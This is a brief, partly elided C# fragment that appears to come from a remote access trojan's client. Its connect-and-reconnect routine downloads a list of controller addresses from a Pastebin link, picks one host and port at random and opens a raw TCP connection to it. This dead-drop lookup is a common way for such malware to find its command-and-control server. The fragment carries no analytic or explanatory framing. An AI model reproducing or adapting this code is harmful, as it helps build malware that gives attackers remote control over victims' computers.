        ...
        public static void InitializeClient() //Connect & reconnect
        {
            try
            {
                ...
                else
                {
                    ...
                    //}
                    HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(Settings.Pastebin);
                    req.Method = "GET";
                    using (WebResponse wr = req.GetResponse())
                    {
                        TextReader reader = new StreamReader(wr.GetResponseStream());
                        string line = "";
                        string text = reader.ReadToEnd();
                        string[] ips = text.Split(new[] { "\n" }, StringSplitOptions.None);
                        Random rd = new Random();
                        int t = rd.Next(0, ips.Length);
                        string ips2 = ips[t];
                        string[] spl = ips2.Split(new[] { ":" }, StringSplitOptions.None);
                        Settings.Hosts = spl[0];
                        Settings.Ports = spl[new Random().Next(1, spl.Length)];
                        TcpClient.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
                    }
